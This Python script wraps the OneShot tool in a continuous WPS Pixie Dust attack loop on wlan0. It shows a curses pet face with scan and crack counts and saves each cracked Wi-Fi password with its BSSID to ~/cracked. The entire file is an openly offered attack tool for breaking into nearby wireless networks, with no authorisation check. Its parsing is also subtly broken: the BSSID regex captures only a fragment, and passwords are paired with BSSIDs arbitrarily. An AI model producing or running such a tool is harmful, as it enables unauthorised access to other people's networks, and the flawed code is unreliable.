#!/usr/bin/env python3
"""
pwnagotchi-like Termux app using normal OneShot with dynamic curses UI
All code in one file. Python 3.9+
Features:
  - Continuous WPS attacks via `sudo oneshot -i wlan0 -K`
  - Live-updating curses-based display of:
       * ASCII pet face
       * Total networks scanned
       * Total cracked networks
  - Save each cracked credential in ~/cracked
"""
import os
import sys
import subprocess
import time
import re
import curses
from datetime import datetime

# Config
INTERFACE = os.environ.get('WIFI_INTERFACE', 'wlan0')
CRACKED_DIR = os.path.expanduser('~/cracked')
SCAN_INTERVAL = 5  # seconds between attack cycles
ONESHOT_CMD = 'oneshot'

os.makedirs(CRACKED_DIR, exist_ok=True)

# ASCII face states
def get_face_lines(state):
    faces = {
        'neutral': ["  -   -  ", " ( o   o )", "   \___/  "],
        'happy':   ["  ^   ^  ", " ( o ^ o )", "   \___/  "],
        'sad':     ["  -   -  ", " ( o . o )", "   \___/  "]
    }
    return faces.get(state, faces['neutral'])

# Run OneShot and capture output
def run_oneshot():
    cmd = ['sudo', ONESHOT_CMD, '-i', INTERFACE, '-K']
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True)
        return proc.stdout + proc.stderr
    except Exception as e:
        return f"[!] OneShot error: {e}"

# Parse output: count networks and list PSKs
def parse_output(output):
    bssids = set(re.findall(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', output))
    passwords = re.findall(r'PSK:\s*(\S+)', output)
    return len(bssids), passwords

# Save cracked password
def save_crack(bssid, password):
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    fname = f"{ts}_{bssid.replace(':','')}.txt"
    path = os.path.join(CRACKED_DIR, fname)
    with open(path, 'w') as f:
        f.write(f"BSSID: {bssid}\nPassword: {password}\n")

# Curses UI loop
def ui_loop(stdscr):
    # Curses setup
    curses.curs_set(False)
    stdscr.nodelay(False)
    stdscr.clear()

    total_scanned = 0
    total_cracked = 0
    face_state = 'neutral'

    while True:
        # Draw UI
        stdscr.clear()
        face_lines = get_face_lines(face_state)
        for idx, line in enumerate(face_lines):
            stdscr.addstr(idx, 0, line)
        stdscr.addstr(5, 0, f"Scanned: {total_scanned}")
        stdscr.addstr(6, 0, f"Cracked: {total_cracked}")
        stdscr.addstr(8, 0, "Press Ctrl+C to exit...")
        stdscr.refresh()

        # Run attack cycle
        output = run_oneshot()
        scanned, pw_list = parse_output(output)
        total_scanned += scanned
        new_cracks = len(pw_list)
        total_cracked += new_cracks
        face_state = 'happy' if new_cracks else 'sad'

        # Save any new cracks
        if new_cracks:
            # associate first BSSID for each password
            bssids = list(set(re.findall(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', output)))
            for i, pwd in enumerate(pw_list):
                bssid = bssids[i] if i < len(bssids) else 'unknown'
                save_crack(bssid, pwd)

        time.sleep(SCAN_INTERVAL)

# Entry point
if __name__ == '__main__':
    if os.geteuid() != 0:
        print("[!] Run as root (tsu)")
        sys.exit(1)
    try:
        curses.wrapper(ui_loop)
    except KeyboardInterrupt:
        pass
